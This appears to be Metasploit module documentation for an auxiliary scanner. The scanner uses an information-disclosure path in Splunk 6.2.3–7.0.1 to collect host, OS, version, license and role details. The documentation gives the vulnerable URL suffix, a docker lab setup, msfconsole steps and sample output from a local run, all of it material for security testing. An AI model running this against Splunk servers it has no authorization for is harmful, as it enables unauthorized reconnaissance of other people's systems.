## Vulnerable Application

Splunk versions 6.2.3 through 7.0.1 allows information disclosure by appending
`/__raw/services/server/info/server-info?output_mode=json` to a query.

### Docker Install

A vulnerable version of Splunk can be installed locally with docker:

`docker run -p 8000:8000 -e "SPLUNK_PASSWORD=splunk" -e "SPLUNK_START_ARGS=--accept-license" -it --name so1 splunk/splunk:6.5.5`

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use auxiliary/gather/splunk_raw_server_info`
1. Do: `SET RHOSTS [IP]`
1. You should receive output about the Splunk version and roles, license status, including license key info, and OS information.

## Options

## Scenarios

```
msf6 > use auxiliary/gather/splunk_raw_server_info 
msf6 auxiliary(gather/splunk_raw_server_info) > exploit
[*] Running module against 127.0.0.1

[+] Output saved to ~/.msf4/loot/20231220130955_default_127.0.0.1_splunk.system.st_442957.bin
[+] Hostname: 3c7b9beb6c3c
[+] CPU Architecture: x86_64
[+] Operating System: Linux
[+] OS Build: #1 SMP PREEMPT_DYNAMIC Debian 6.5.3-1kali2 (2023-10-03)
[+] OS Version: 6.5.0-kali2-amd64
[+] Splunk Version: 6.5.5
[+] Trial Version?: true
[+] Splunk Forwarder?: false
[+] Splunk Product Type: enterprise
[+] License State: EXPIRED
[+] License Key(s): []
[+] Splunk Server Roles: ["indexer", "license_master"]
[+] Splunk Server Startup Time: 2023-12-19 20:56:13
```
